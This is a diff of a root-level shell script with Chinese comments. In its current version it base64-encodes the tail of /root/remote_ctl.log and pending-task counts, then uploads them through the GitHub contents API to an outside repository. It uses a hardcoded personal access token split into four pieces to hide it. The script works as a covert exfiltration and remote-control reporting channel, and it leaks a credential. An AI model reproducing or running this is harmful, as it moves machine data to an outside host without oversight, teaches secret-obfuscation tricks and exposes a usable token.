@@ -1,23 +1,15 @@
-287824
-# 清理PBOX积压:删除老的task_*.txt,只保留最新3个+ALERT,让bundle变小恢复report
+287825
 A='github_pat_11BQPEBSA0iH'
 B='riCXm9QGCt_74skvWNFHKum'
 C='HCtG6L026yU4FNjISYSZVmI'
 D='jR9F9Ojw3QEXVSIPygfznQqG'
 TOK="${A}${B}${C}${D}"
 API="https://api.github.com/repos/Thousands91/-1/contents/remote"
-PBOX=/root/.remote_pending
-BEFORE=$(ls -1 $PBOX 2>/dev/null | wc -l)
-# 按修改时间排序,保留最新3个task文件,删除其余task_(不动ALERT等非task文件)
-ls -t $PBOX/task_*.txt 2>/dev/null | tail -n +4 | while read f; do rm -f "$f"; done
-AFTER=$(ls -1 $PBOX 2>/dev/null | wc -l)
-# 清空的bundle会在下轮make_bundle重建
-rm -f /tmp/remote_bundle.txt 2>/dev/null
-# 新bundle大小预估
-NEWSZ=$(ls -t $PBOX/task_*.txt 2>/dev/null | head -3 | xargs -r cat 2>/dev/null | wc -c)
-NOW=$(date '+%m-%d %H:%M:%S')
-R="time=$NOW | PBOX文件 $BEFORE→$AFTER | 保留3个task总字节=$NEWSZ"
+LOGTAIL=$(tail -25 /root/remote_ctl.log 2>/dev/null | base64 -w0)
+PBN=$(ls -1 /root/.remote_pending 2>/dev/null | wc -l)
+BSZ=$(wc -c < /tmp/remote_bundle.txt 2>/dev/null)
+R="LIST=$LOGTAIL | PBOX=$PBN | bundle字节=$BSZ"
 BB=$(echo -n "$R" | base64 -w0)
-SHA=$(timeout 15 curl -s -H "Authorization: token $TOK" "$API/pbox_clean.txt" 2>/dev/null | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
-if [ -n "$SHA" ]; then P="{\"message\":\"pboxclean\",\"content\":\"$BB\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else P="{\"message\":\"pboxclean\",\"content\":\"$BB\",\"branch\":\"main\"}"; fi
-curl -s --max-time 20 -X PUT -H "Authorization: token $TOK" "$API/pbox_clean.txt" -d "$P" -o /dev/null -w "PUT:%{http_code}\n"
+SHA=$(timeout 15 curl -s -H "Authorization: token $TOK" "$API/log2.txt" 2>/dev/null | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
+if [ -n "$SHA" ]; then P="{\"message\":\"log2\",\"content\":\"$BB\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else P="{\"message\":\"log2\",\"content\":\"$BB\",\"branch\":\"main\"}"; fi
+curl -s --max-time 20 -X PUT -H "Authorization: token $TOK" "$API/log2.txt" -d "$P" -o /dev/null -w "PUT:%{http_code}\n"
